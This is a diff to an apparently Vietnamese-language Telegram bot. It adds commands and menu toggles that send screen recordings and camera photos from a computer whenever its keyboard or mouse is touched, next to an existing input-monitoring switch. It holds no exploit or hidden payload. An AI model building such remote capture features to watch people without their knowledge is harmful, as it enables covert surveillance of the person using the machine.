@@ -430,6 +430,26 @@ def register_telegram_handlers(ctx):
             return
         set_boolean_setting(message, "input_monitoring_enabled", False, "giám sát bàn phím/chuột")
 
+    @bot.message_handler(commands=['screen_record_on'])
+    def turn_screen_record_on(message):
+        if not verify_user(message): return
+        set_boolean_setting(message, "send_screen_record", True, "gửi video quay màn hình khi đụng phím/chuột")
+
+    @bot.message_handler(commands=['screen_record_off'])
+    def turn_screen_record_off(message):
+        if not verify_user(message): return
+        set_boolean_setting(message, "send_screen_record", False, "gửi video quay màn hình khi đụng phím/chuột")
+
+    @bot.message_handler(commands=['input_photo_on'])
+    def turn_input_photo_on(message):
+        if not verify_user(message): return
+        set_boolean_setting(message, "send_input_camera_photo", True, "gửi ảnh camera khi đụng phím/chuột")
+
+    @bot.message_handler(commands=['input_photo_off'])
+    def turn_input_photo_off(message):
+        if not verify_user(message): return
+        set_boolean_setting(message, "send_input_camera_photo", False, "gửi ảnh camera khi đụng phím/chuột")
+
     @bot.message_handler(commands=['set_quiet_start'])
     def set_quiet_start(message):
         if not verify_user(message): return
@@ -725,6 +745,18 @@ def register_telegram_handlers(ctx):
                 return
             ctx.update_setting("input_monitoring_enabled", not current_input)
             bot.answer_callback_query(call.id, "Đã cập nhật giám sát phím/chuột")
+            edit_menu_message(call, format_settings_message(), build_settings_menu())
+            return
+
+        if call.data == "setting:toggle_screen_record":
+            ctx.update_setting("send_screen_record", not ctx.get_setting("send_screen_record"))
+            bot.answer_callback_query(call.id, "Đã cập nhật quay màn hình")
+            edit_menu_message(call, format_settings_message(), build_settings_menu())
+            return
+
+        if call.data == "setting:toggle_input_camera_photo":
+            ctx.update_setting("send_input_camera_photo", not ctx.get_setting("send_input_camera_photo"))
+            bot.answer_callback_query(call.id, "Đã cập nhật gửi ảnh camera đụng phím")
             edit_menu_message(call, format_settings_message(), build_settings_menu())
             return
 
